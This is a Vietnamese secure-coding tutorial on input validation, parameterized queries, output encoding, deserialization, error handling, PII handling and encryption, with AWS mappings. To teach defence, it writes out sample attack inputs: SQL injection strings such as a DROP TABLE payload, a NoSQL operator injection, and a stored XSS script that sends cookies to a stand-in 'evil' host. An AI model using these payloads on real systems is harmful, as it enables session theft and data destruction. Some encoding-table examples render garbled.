# Secure Coding: input, output & data

Phần lớn lỗ hổng nghiêm trọng không nằm ở thuật toán phức tạp, mà nằm ở chỗ dữ liệu đi vào và đi ra khỏi code của bạn. Là kỹ sư xây hệ thống, bạn không cần biết viết exploit — bạn cần biết dữ liệu nào *không tin được*, nó sẽ bị diễn giải lại ở đâu (SQL engine, trình duyệt, shell, deserializer), và đặt rào chắn đúng chỗ. Bài này đi theo dòng đời của dữ liệu: **vào → xử lý → ra → lưu trữ**.

> 💡 **Nguyên tắc**: Mọi dữ liệu từ bên ngoài process của bạn (HTTP request, file upload, message queue, response của service khác, biến môi trường người dùng kiểm soát) đều là *untrusted* cho đến khi được validate. "Bên ngoài" gồm cả service nội bộ — zero trust không dừng ở mạng.

Cả bài là một dòng chảy: dữ liệu không tin được đi qua từng biên, mỗi biên có **một rào chắn** đặt đúng chỗ. Đây là bản đồ tổng thể:

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 250" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Vòng đời dữ liệu với rào chắn tại mỗi biên</title>
  <desc>Dữ liệu không tin được đi qua các bước: validate bằng allowlist, xử lý, parameterize hoặc encode theo context, output, rồi encrypt at rest khi lưu trữ; mỗi mũi tên giữa hai bước là một biện pháp phòng thủ.</desc>
  <defs>
    <marker id="ah" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0 0 L10 5 L0 10 z" fill="currentColor"/>
    </marker>
  </defs>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Dòng đời dữ liệu — rào chắn tại mỗi biên</text>
  <g font-size="11.5">
    <rect x="16" y="44" width="120" height="54" rx="9" fill="#f59e0b" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="76" y="68" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Untrusted</text>
    <text x="76" y="84" text-anchor="middle" fill="currentColor" opacity="0.7">input</text>

    <rect x="216" y="44" width="120" height="54" rx="9" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="276" y="76" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Xử lý</text>

    <rect x="416" y="44" width="120" height="54" rx="9" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="476" y="76" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Output</text>

    <rect x="584" y="44" width="120" height="54" rx="9" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="644" y="76" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Lưu trữ</text>
  </g>
  <g stroke="currentColor" stroke-width="1.6" fill="none" marker-end="url(#ah)">
    <path d="M136 71 H214"/>
    <path d="M336 71 H414"/>
    <path d="M536 71 H582"/>
  </g>
  <g font-size="11">
    <rect x="138" y="118" width="76" height="40" rx="8" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.3"/>
    <text x="176" y="135" font-size="10.5" font-weight="700" text-anchor="middle" fill="currentColor">Validate</text>
    <text x="176" y="149" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.75">allowlist</text>
    <path d="M176 116 V99" stroke="currentColor" stroke-width="1.4" fill="none" marker-end="url(#ah)"/>

    <rect x="324" y="118" width="104" height="40" rx="8" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.3"/>
    <text x="376" y="135" font-size="10.5" font-weight="700" text-anchor="middle" fill="currentColor">Parameterize</text>
    <text x="376" y="149" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.75">/ encode theo context</text>
    <path d="M376 116 V99" stroke="currentColor" stroke-width="1.4" fill="none" marker-end="url(#ah)"/>

    <rect x="510" y="118" width="98" height="40" rx="8" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.3"/>
    <text x="559" y="135" font-size="10.5" font-weight="700" text-anchor="middle" fill="currentColor">Encrypt</text>
    <text x="559" y="149" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.75">at rest</text>
    <path d="M559 116 V99" stroke="currentColor" stroke-width="1.4" fill="none" marker-end="url(#ah)"/>
  </g>
  <text x="16" y="196" font-size="11.5" fill="currentColor" opacity="0.8">Mỗi mũi tên = một biên tin cậy; mỗi rào (lục) là biện pháp phòng thủ đặt đúng tại biên đó.</text>
  <text x="16" y="216" font-size="11.5" fill="currentColor" opacity="0.8">Validate (mục 1) · tách data khỏi code (mục 2) · encode theo đích (mục 3) · encrypt (mục 7).</text>
</svg>

## 1. Validate input: allowlist, không phải blocklist

Sai lầm kinh điển là cố liệt kê những thứ *xấu* để chặn (blocklist). Attacker chỉ cần một biến thể bạn chưa nghĩ ra. Hãy định nghĩa cái *được phép* (allowlist) và từ chối phần còn lại.

Ví dụ tấn công: một endpoint nhận `?sort=name` rồi nhét thẳng vào câu SQL `ORDER BY name`. Attacker gửi `?sort=name; DROP TABLE users--`. Bạn thử chặn dấu `;` và `--`, nhưng họ dùng `sort=(SELECT CASE WHEN ...)` để blind SQLi. Blocklist thua.

```python
# ❌ TRƯỚC: blocklist + nội suy chuỗi
BAD = [";", "--", "drop"]
def build_query(sort):
    if any(b in sort.lower() for b in BAD):
        raise ValueError("invalid")
    return f"SELECT * FROM users ORDER BY {sort}"  # vẫn injectable

# ✅ SAU: allowlist — chỉ map các giá trị hợp lệ đã biết
ALLOWED_SORT = {
    "name":    "name ASC",
    "name_desc": "name DESC",
    "created": "created_at DESC",
}
def build_query(sort: str) -> str:
    clause = ALLOWED_SORT.get(sort)
    if clause is None:
        raise ValueError("unknown sort key")  # default deny
    return f"SELECT * FROM users ORDER BY {clause}"
```

Với dữ liệu có cấu trúc (body JSON, query params), dùng schema validation thay vì check thủ công. Validate ở **ranh giới** (boundary) ngay khi nhận, rồi truyền các object đã được kiểm chứng vào sâu bên trong.

```typescript
// Node.js + zod: validate & ép kiểu tại boundary
import { z } from "zod";

const CreateUser = z.object({
  email: z.string().email().max(254),
  age: z.number().int().min(0).max(150),
  role: z.enum(["viewer", "editor"]),          // allowlist nội tại
  tags: z.array(z.string().regex(/^[a-z0-9-]{1,32}$/)).max(10),
});

app.post("/users", (req, res) => {
  const parsed = CreateUser.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid payload" }); // không lộ chi tiết internal
  }
  const user = parsed.data; // từ đây trở đi: typed + trusted
  createUser(user);
});
```

> ⚠️ **Lỗ hổng — Mass assignment**: `User.create(req.body)` cho phép attacker thêm `{"is_admin": true}` vào body. Luôn allowlist các field được nhận; đừng bind thẳng request vào model/ORM.

**Checklist validate input**
- [ ] Validate tại boundary (controller/handler), không rải rác trong business logic.
- [ ] Allowlist kiểu, độ dài, range, format (regex neo `^...$`), enum.
- [ ] Chuẩn hoá (canonicalize/normalize Unicode NFC) *trước* khi validate để tránh bypass.
- [ ] Default deny: thiếu rule = từ chối, không phải cho qua.
- [ ] Giới hạn kích thước payload, độ sâu JSON, số phần tử mảng (chống DoS).

## 2. Parameterized query / prepared statement

Validate input là *defense in depth*, không phải lớp bảo vệ duy nhất chống SQLi. Lớp đúng đắn là **tách dữ liệu khỏi mã lệnh**: dùng placeholder, để driver gửi data riêng. Khi đó dù input chứa `' OR 1=1--`, nó vẫn chỉ là một chuỗi giá trị, không bao giờ được parse thành SQL.

```python
# ❌ TRƯỚC: nội suy → SQL injection
cur.execute(f"SELECT * FROM users WHERE email = '{email}'")

# ✅ SAU: parameterized — driver bind tham số an toàn
cur.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```java
// Java JDBC: PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT id FROM accounts WHERE owner = ? AND status = ?");
ps.setString(1, owner);
ps.setString(2, status);
ResultSet rs = ps.executeQuery();
```

Lưu ý: placeholder chỉ bind được **giá trị**, không bind được **tên bảng/cột hay từ khoá** (`ORDER BY`, `LIMIT` đôi khi cũng vướng). Đó chính là chỗ phải quay lại allowlist như mục 1. Nguyên tắc tương tự áp dụng cho NoSQL (ví dụ MongoDB: đừng truyền object thô từ user vào filter — `{ "$gt": "" }` là NoSQL injection), cho LDAP, và cho OS command (dùng API truyền **mảng** `args`, không ghép chuỗi đưa vào shell).

```go
// Go: tránh command injection — truyền args, KHÔNG dùng "sh -c <chuỗi>"
cmd := exec.Command("convert", inputPath, "-resize", "100x100", outputPath)
// ❌ exec.Command("sh", "-c", "convert "+inputPath+" ...")
```

```cpp
// C++17: tránh command injection — truyền args qua execvp, KHÔNG dùng "sh -c <chuỗi>"
#include <unistd.h>
#include <string>
#include <vector>

void resizeImage(const std::string& inputPath, const std::string& outputPath) {
    // Mỗi tham số là một phần tử riêng — không bao giờ ghép thành chuỗi shell
    std::vector<std::string> args = {"convert", inputPath, "-resize", "100x100", outputPath};
    std::vector<char*> argv;
    for (auto& a : args) argv.push_back(const_cast<char*>(a.c_str()));
    argv.push_back(nullptr);

    if (fork() == 0) {
        execvp(argv[0], argv.data());  // không qua shell, không bị inject
        _exit(127);
    }
    // ❌ system(("convert " + inputPath + " ...").c_str());  // qua /bin/sh → injectable
}
```

> 💡 **Nguyên tắc**: Với mỗi interpreter (SQL, shell, LDAP, XPath, template engine), tìm cơ chế "data ≠ code" của nó (parameter binding, arg array) và dùng nó *mặc định*. Nội suy chuỗi vào ngôn ngữ khác là code smell cần review.

## 3. Output encoding theo context

Input đã sạch không có nghĩa là output an toàn. Cùng một chuỗi `"<b>"` vô hại trong HTML body lại nguy hiểm trong thuộc tính, trong `<script>`, hay trong URL. **Encoding phải theo đúng context nơi dữ liệu được đặt vào.** Đây là gốc rễ của XSS.

Ví dụ tấn công (Stored XSS): user đặt display name là `<script>fetch('//evil/?c='+document.cookie)</script>`. Khi trang khác render tên này thẳng vào HTML, script chạy trong phiên của nạn nhân → đánh cắp session.

| Context đặt dữ liệu | Encoding cần dùng | Ví dụ ký tự xử lý |
|---|---|---|
| HTML body / text node | HTML entity encode | `<` → `<`, `&` → `&` |
| HTML attribute (có quote) | Attribute encode + luôn quote | `"` → `"` |
| Bên trong `<script>` / JS | JS string encode (hoặc `JSON.stringify`) | `</`, `'`, newline |
| URL query/path component | URL/percent encode | space → `%20` |
| CSS value | CSS encode | escape `\` |

Cùng một giá trị toả ra nhiều đích, mỗi đích đòi một bộ encode khác nhau — chọn encode theo *nơi dữ liệu được đặt vào*, không theo nguồn:

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 300" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Output encoding theo context — một giá trị, nhiều đích, nhiều bộ encode</title>
  <desc>Một chuỗi nguy hiểm đặt vào năm context khác nhau (HTML body, HTML attribute, trong script JS, URL, CSS) cần năm cách encode khác nhau; encode phải theo đích đến chứ không theo nguồn.</desc>
  <defs>
    <marker id="ah2" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0 0 L10 5 L0 10 z" fill="currentColor"/>
    </marker>
  </defs>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Encode theo đích đến, không theo nguồn</text>
  <g>
    <rect x="16" y="116" width="150" height="64" rx="10" fill="#f59e0b" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.3"/>
    <text x="91" y="142" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Một giá trị</text>
    <text x="91" y="162" font-size="11" text-anchor="middle" fill="currentColor" opacity="0.75">vd. &quot;&lt;b&gt;...&quot;</text>
  </g>
  <g stroke="currentColor" stroke-width="1.5" fill="none" marker-end="url(#ah2)">
    <path d="M166 130 C 240 70, 280 60, 356 56"/>
    <path d="M166 140 C 240 110, 280 108, 356 110"/>
    <path d="M166 150 C 240 150, 280 160, 356 164"/>
    <path d="M166 160 C 240 195, 280 210, 356 218"/>
    <path d="M166 168 C 240 235, 280 264, 356 272"/>
  </g>
  <g font-size="11">
    <rect x="356" y="36" width="348" height="40" rx="8" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="368" y="53" font-size="11.5" font-weight="700" fill="currentColor">HTML body / text</text>
    <text x="368" y="69" fill="currentColor" opacity="0.78">→ HTML entity encode</text>

    <rect x="356" y="90" width="348" height="40" rx="8" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="368" y="107" font-size="11.5" font-weight="700" fill="currentColor">HTML attribute (quote)</text>
    <text x="368" y="123" fill="currentColor" opacity="0.78">→ attribute encode + luôn quote</text>

    <rect x="356" y="144" width="348" height="40" rx="8" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="368" y="161" font-size="11.5" font-weight="700" fill="currentColor">Trong &lt;script&gt; / JS</text>
    <text x="368" y="177" fill="currentColor" opacity="0.78">→ JS string encode (JSON.stringify)</text>

    <rect x="356" y="198" width="348" height="40" rx="8" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="368" y="215" font-size="11.5" font-weight="700" fill="currentColor">URL query / path</text>
    <text x="368" y="231" fill="currentColor" opacity="0.78">→ URL / percent encode</text>

    <rect x="356" y="252" width="348" height="40" rx="8" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.25"/>
    <text x="368" y="269" font-size="11.5" font-weight="700" fill="currentColor">CSS value</text>
    <text x="368" y="285" fill="currentColor" opacity="0.78">→ CSS encode</text>
  </g>
</svg>

```jsx
// ✅ React mặc định HTML-encode mọi {biểu thức} trong JSX
function Profile({ name }) {
  return <span>{name}</span>; // an toàn cho HTML body context
}

// ⚠️ Các "cửa hậu" bỏ qua encoding — chỉ dùng với nội dung đã sanitize
<div dangerouslySetInnerHTML={{ __html: sanitize(userHtml) }} />
```

```javascript
// Nếu phải nhúng data vào <script> server-side, encode đúng context JS:
const safe = JSON.stringify(userData)            // encode JS string/object
  .replace(/</g, "\\u003c");                      // chặn </script> breakout
res.send(`<script>window.__DATA__ = ${safe};</script>`);
```

> ⚠️ **Lỗ hổng — sai context**: HTML-encode một giá trị rồi nhét vào `href="javascript:..."` hay vào `<script>` không hề an toàn, vì `<` không phải ký tự nguy hiểm trong JS context. Encode đúng *đích đến*, không phải đúng *nguồn*.

Với rich text do user nhập (cho phép một số thẻ), đừng tự viết regex lọc thẻ — dùng thư viện sanitize đã được kiểm chứng (DOMPurify ở client, các sanitizer maintained ở server) với allowlist thẻ/thuộc tính. Bổ sung **Content-Security-Policy** làm lớp chặn cuối: dù lọt một XSS, CSP `script-src 'self'` ngăn inline script và domain lạ thực thi.

## 4. Tránh deserialization nguy hiểm

Deserialize dữ liệu untrusted bằng cơ chế cho phép tạo object tuỳ ý là một trong những lỗ hổng dễ dẫn tới RCE (remote code execution) nhất. Vấn đề: định dạng "native object" (Java serialization, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`, YAML với tag) có thể *khởi tạo class bất kỳ và chạy code* trong lúc dựng lại object.

Ví dụ tấn công: API nhận một cookie/field là object Java đã serialize. Attacker gửi một "gadget chain" (chuỗi object lợi dụng các class có sẵn trong classpath) khiến server chạy lệnh khi `readObject()` được gọi — không cần biết mật khẩu, không cần lỗ hổng nào khác.

```python
# ❌ TRƯỚC: pickle trên dữ liệu từ network = RCE
import pickle
obj = pickle.loads(request.body)     # body do attacker kiểm soát

# ✅ SAU: dùng định dạng data-only + schema
import json
data = json.loads(request.body)      # JSON không thể khởi tạo class/chạy code
user = CreateUser(**validate(data))  # validate rồi mới dựng object có kiểm soát
```

Nguyên tắc thực dụng:
- Dùng **data formats** (JSON, Protobuf, MessagePack) cho dữ liệu qua ranh giới tin cậy — chúng mang dữ liệu, không mang hành vi.
- Không bao giờ `pickle.loads` / Java native deserialize / `BinaryFormatter` / `yaml.load` (dùng `yaml.safe_load`) trên input untrusted.
- Nếu buộc phải deserialize sang object, dùng cơ chế bind **theo schema/type cụ thể** (Jackson với type cố định, không bật polymorphic typing với input ngoài), và allowlist class.
- XML: tắt external entity (chống **XXE**) — `disallow-doctype-decl` hoặc tắt DTD/external entities trong parser.

> 💡 **Nguyên tắc**: Hỏi "định dạng này có thể *tạo ra hành vi*, hay chỉ mang *dữ liệu*?". Nếu mang hành vi, không dùng nó với input từ ngoài.

## 5. Xử lý lỗi không làm lộ thông tin

Thông báo lỗi là kênh rò rỉ kinh điển. Stack trace, câu SQL gốc, đường dẫn file, phiên bản framework, hay sự khác biệt giữa "user không tồn tại" và "sai mật khẩu" đều giúp attacker do thám và tấn công có chủ đích.

Ví dụ tấn công (user enumeration): form login trả `"Email không tồn tại"` vs `"Sai mật khẩu"`. Attacker dò được danh sách email hợp lệ → tập trung brute-force/credential stuffing. Phòng: thông điệp đồng nhất + so sánh thời gian không đổi để tránh timing oracle.

```python
# ❌ TRƯỚC: lộ chi tiết + cho phép enumeration
try:
    user = db.get_user(email)        # raise nếu không có
    if user.password_hash != hash(pw):
        return {"error": "Wrong password"}, 401
except Exception as e:
    return {"error": str(e), "trace": traceback.format_exc()}, 500

# ✅ SAU: thông điệp generic ra ngoài, chi tiết chỉ vào log nội bộ
try:
    user = db.get_user(email)
    ok = user is not None and verify_password(pw, user.password_hash)
    if not ok:
        return {"error": "Email hoặc mật khẩu không đúng"}, 401  # đồng nhất
    ...
except Exception:
    logger.exception("login failed", extra={"req_id": req_id})   # trace vào log
    return {"error": "Đã có lỗi xảy ra", "request_id": req_id}, 500
```

**Checklist xử lý lỗi**
- [ ] Client chỉ nhận thông điệp generic + một `request_id` để đối soát; chi tiết nằm trong log.
- [ ] Tắt debug/stack trace ở môi trường production.
- [ ] Thông điệp auth/login đồng nhất (không phân biệt user tồn tại hay không).
- [ ] Fail closed: khi không chắc, từ chối truy cập — không "fail open" cho qua.
- [ ] Đừng log secret/PII vào trace (xem mục dưới).

## 6. Quản lý PII/PHI & data classification

Bạn không thể bảo vệ thứ bạn chưa phân loại. **Data classification** là gán nhãn cho dữ liệu theo mức nhạy cảm, từ đó suy ra cách xử lý (lưu, log, truyền, ai được xem, giữ bao lâu).

| Lớp | Ví dụ | Yêu cầu xử lý điển hình |
|---|---|---|
| Public | tên sản phẩm, blog | không hạn chế |
| Internal | log hệ thống, metric | chỉ trong tổ chức |
| Confidential / PII | email, địa chỉ, số điện thoại | encrypt, access control, audit |
| Restricted / PHI / secret | hồ sơ y tế, số thẻ, mật khẩu | encrypt mạnh, tối thiểu hoá, không log, retention chặt |

PII (Personally Identifiable Information) và PHI (Protected Health Information — phạm vi HIPAA) cần xử lý đặc biệt:

- **Data minimization**: chỉ thu thập và lưu thứ thật sự cần. Dữ liệu không lưu thì không thể bị lộ.
- **Không log PII/PHI/secret**. Mask khi cần debug.
- **Tokenization/pseudonymization**: thay giá trị nhạy cảm bằng token; bản gốc giữ trong vault riêng.
- **Retention & deletion**: định thời gian giữ; hỗ trợ quyền xoá (GDPR right to erasure).
- **Mật khẩu**: không "encrypt" — phải **hash** bằng thuật toán chậm (bcrypt/argon2/scrypt) + per-user salt.

```typescript
// Mask PII trong log
const maskEmail = (e: string) =>
  e.replace(/^(.).*(@.*)$/, "$1***$2");        // a***@x.com

logger.info("user login", { email: maskEmail(user.email), userId: user.id });
// ❌ logger.info("user login", { user });  // dump cả object → rò rỉ PII

// Hash mật khẩu (KHÔNG mã hoá có thể giải ngược)
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12);   // cost factor ~12
const ok = await bcrypt.compare(input, hash);   // so sánh constant-time
```

> ⚠️ **Lỗ hổng — secret/PII trong log & analytics**: log tập trung, APM, error tracker (Sentry...) thường được nhiều người xem và lưu lâu. Một dòng `console.log(req.body)` có thể đẩy số thẻ vào hệ thống không đạt chuẩn lưu trữ dữ liệu nhạy cảm. Redact ở tầng logger.

## 7. Encryption at rest & in transit trong code

Phân loại dữ liệu xong, encryption là cách thực thi nó về mặt kỹ thuật, ở hai trạng thái:

**In transit** — dữ liệu đang di chuyển trên mạng:
- TLS ở mọi nơi, gồm cả traffic *nội bộ* giữa các service (không tin cậy mạng nội bộ).
- Bật HSTS; từ chối downgrade về HTTP. Verify certificate (đừng tắt verify cho "tiện").

```python
# ❌ TRƯỚC: tắt verify TLS — mở đường cho man-in-the-middle
requests.get(url, verify=False)

# ✅ SAU: verify mặc định (đúng); pin/CA bundle nếu cần
requests.get(url)   # verify=True là mặc định — đừng tắt
```

**At rest** — dữ liệu đang lưu (DB, file, backup, object storage):
- Mã hoã ở tầng storage/DB; với field cực nhạy cảm có thể mã hoá ở tầng application (envelope encryption).
- **Đừng tự cài thuật toán crypto.** Dùng thư viện cấp cao đã được audit và một **KMS** để quản lý key.
- **Key management** là phần khó hơn cả thuật toán: tách key khỏi dữ liệu, rotate định kỳ, phân quyền dùng key, audit truy cập key. Secret/key **không bao giờ** nằm trong source code hay commit vào Git — dùng secret manager.

```python
# Envelope encryption ở tầng app cho 1 field nhạy cảm (vd. số bảo hiểm)
# DEK (data key) do KMS cấp; chỉ lưu ciphertext của DEK kèm dữ liệu.
from cryptography.fernet import Fernet   # AEAD: mã hoá + xác thực toàn vẹn

plaintext_dek = get_data_key_from_kms()              # KMS sinh & bọc key
token = Fernet(plaintext_dek).encrypt(ssn.encode())  # lưu `token` vào DB
# Khi đọc: xin KMS giải mã wrapped DEK → giải mã field.
```

Envelope encryption tách *key* khỏi *dữ liệu*: KMS giữ key gốc, DEK chỉ tồn tại dạng plaintext trong RAM lúc dùng, còn trên đĩa luôn nằm ở dạng đã bọc cạnh ciphertext:

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 366" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
  <title>Envelope encryption — bảo vệ dữ liệu là bảo vệ key</title>
  <desc>DEK plaintext mã hoá field nhạy cảm, sau đó chính DEK lại được bọc bên trong lớp bảo vệ của CMK (KMS) thành wrapped DEK. Trên đĩa chỉ lưu ciphertext của field cạnh wrapped DEK. Khi đọc, KMS giải wrapped DEK ra DEK plaintext rồi giải field.</desc>
  <defs>
    <marker id="ah3" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0 0 L10 5 L0 10 z" fill="currentColor"/>
    </marker>
  </defs>
  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Envelope encryption — bảo vệ dữ liệu = bảo vệ key</text>

  <text x="16" y="56" font-size="11.5" font-weight="700" fill="currentColor" opacity="0.85">Khi ghi: bọc dữ liệu bằng DEK, rồi bọc DEK trong CMK</text>

  <rect x="16" y="68" width="318" height="92" rx="10" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="175" y="90" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">Field nhạy cảm (plaintext)</text>
  <text x="175" y="107" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.72">vd. số bảo hiểm</text>
  <rect x="40" y="116" width="270" height="34" rx="7" fill="#f59e0b" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="175" y="137" font-size="10.5" text-anchor="middle" fill="currentColor">DEK plaintext mã hoá → ciphertext field</text>

  <path d="M338 114 H378" stroke="currentColor" stroke-width="1.6" fill="none" marker-end="url(#ah3)"/>

  <rect x="382" y="68" width="322" height="92" rx="10" fill="#8b5cf6" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.35"/>
  <text x="543" y="90" font-size="12" font-weight="700" text-anchor="middle" fill="currentColor">CMK (master key, trong KMS)</text>
  <text x="543" y="106" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.72">lồng DEK vào trong lớp bảo vệ của CMK</text>
  <rect x="408" y="116" width="270" height="34" rx="7" fill="#10b981" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="543" y="137" font-size="10.5" text-anchor="middle" fill="currentColor">DEK (bọc trong CMK) = wrapped DEK</text>

  <text x="16" y="190" font-size="11.5" font-weight="700" fill="currentColor" opacity="0.85">Trên đĩa (DB) chỉ còn 2 thứ cạnh nhau — đều vô dụng nếu thiếu KMS</text>

  <rect x="16" y="200" width="688" height="64" rx="10" fill="#10b981" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.3"/>
  <rect x="36" y="216" width="312" height="34" rx="7" fill="#3b82f6" fill-opacity="0.16" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="192" y="237" font-size="10.5" text-anchor="middle" fill="currentColor">ciphertext của field</text>
  <rect x="372" y="216" width="312" height="34" rx="7" fill="#8b5cf6" fill-opacity="0.18" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="528" y="237" font-size="10.5" text-anchor="middle" fill="currentColor">wrapped DEK (DEK bọc trong CMK)</text>

  <path d="M672 160 V198" stroke="currentColor" stroke-width="1.6" fill="none" marker-end="url(#ah3)"/>

  <rect x="16" y="280" width="688" height="40" rx="9" fill="#f59e0b" fill-opacity="0.12" stroke="currentColor" stroke-opacity="0.3"/>
  <text x="28" y="305" font-size="10.5" fill="currentColor"><tspan font-weight="700">Khi đọc:</tspan> gửi wrapped DEK cho KMS → KMS giải ra DEK plaintext → dùng DEK giải ciphertext field.</text>

  <text x="16" y="344" font-size="11" fill="currentColor" opacity="0.78">Mất DB nhưng không có quyền KMS → chỉ có ciphertext + DEK đã bọc, vô dụng. Mất key = mất tất cả.</text>
</svg>

> 💡 **Nguyên tắc**: Encryption chuyển bài toán "bảo vệ dữ liệu" thành "bảo vệ key". Nếu key nằm cạnh dữ liệu (hardcode, cùng repo, cùng quyền truy cập), bạn chưa bảo vệ được gì.

## Tổng kết nhanh

- Untrusted input → validate bằng **allowlist** tại boundary.
- Sang interpreter khác → **tách data khỏi code** (parameterized query, arg array).
- Đưa data ra ngoài → **encode theo context** (chống XSS).
- Đừng **deserialize** định dạng mang hành vi từ input ngoài.
- Lỗi ra ngoài **generic**; chi tiết vào log; **fail closed**.
- **Phân loại** dữ liệu; tối thiểu hoá & không log PII/PHI/secret.
- **Encrypt** in transit + at rest; bài toán thật là **key management**.

## Liên hệ sang AWS

Những nguyên tắc trên ánh xạ trực tiếp sang dịch vụ AWS khi bạn xây trên cloud:

- **Input/output ở edge** — **AWS WAF** đứng trước CloudFront/ALB/API Gateway, có managed rule cho SQLi và XSS; là lớp *defense in depth*, không thay thế parameterized query và output encoding trong code.
- **Secret & key management** — **AWS Secrets Manager** / **SSM Parameter Store (SecureString)** giữ DB credential, API key ngoài source code (có rotation tự động). **AWS KMS** quản lý CMK cho envelope encryption; cấp quyền dùng key qua key policy + IAM, mọi lần dùng được log ở CloudTrail.
- **Encryption at rest** — bật mã hoá KMS cho **S3**, **RDS/Aurora**, **EBS**, **DynamoDB**; ép TLS in transit bằng bucket policy / security group, dùng ACM cấp và tự rotate certificate.
- **Least privilege & data access** — **IAM** policy hẹp cho từng service/role (không dùng `*`); **S3 Block Public Access** + bucket policy chống lộ dữ liệu; **Amazon Macie** tự phát hiện PII/PHI trong S3 phục vụ data classification.
- **Phát hiện & phản ứng** — **GuardDuty** phát hiện hành vi bất thường (credential bị lạm dụng, gọi API lạ); **CloudTrail** + **CloudWatch Logs** lưu audit, kết hợp redact PII ở tầng logger trước khi đẩy log.
- **Bảo vệ secret trong CI/CD** — bật quét secret (ví dụ tích hợp scan trong pipeline / push protection) để chặn key lọt vào repo ngay từ commit.
